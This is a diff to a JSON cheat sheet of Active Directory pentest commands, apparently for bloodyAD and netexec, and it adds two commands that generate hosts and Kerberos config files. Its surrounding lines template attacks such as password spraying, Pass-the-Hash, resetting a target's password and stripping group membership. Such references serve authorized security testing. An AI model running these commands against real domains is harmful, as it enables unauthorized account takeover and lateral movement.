@@ -40,7 +40,6 @@
     { "desc": "Set password", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set password {{TARGET}} '{{NEWPASS}}'" },
     { "desc": "Remove user from group", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove groupMember '{{GROUP}}' {{TARGET_USER}}" },
     { "desc": "Remove shadow credentials", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove shadowCredentials {{TARGET_USER}}" },
-
     { "desc": "Kerberos auth (ccache)", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -k ccache={{CCACHE}} get object {{TARGET}}" },
     { "desc": "Pass-the-Hash", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p '{{LMHASH}}:{{NTHASH}}' get object {{TARGET}}" },
     { "desc": "Certificate auth", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -c '{{KEY}}:{{CERT}}' get object {{TARGET}}" },
@@ -91,6 +90,8 @@
     "tags": ["SMB", "WinRM", "LDAP", "RDP", "spray", "exec"],
     "commands": [
       { "desc": "SMB Recon", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}}" },
+      { "desc": "Generate hosts file", "cmd": "netexec smb {{IP}} --generate-hosts-file hosts" },
+      { "desc": "Generate krb5.conf file", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --generate-krb5-file Generated_krb5.conf" },
       { "desc": "SMB Password Spray", "cmd": "netexec smb {{IP}} -u users.txt -p {{PASS}} --continue-on-success" },
       { "desc": "SMB List Shares", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --shares" },
       { "desc": "Spider share", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M spider_plus --share '{{TARGET}}'" },
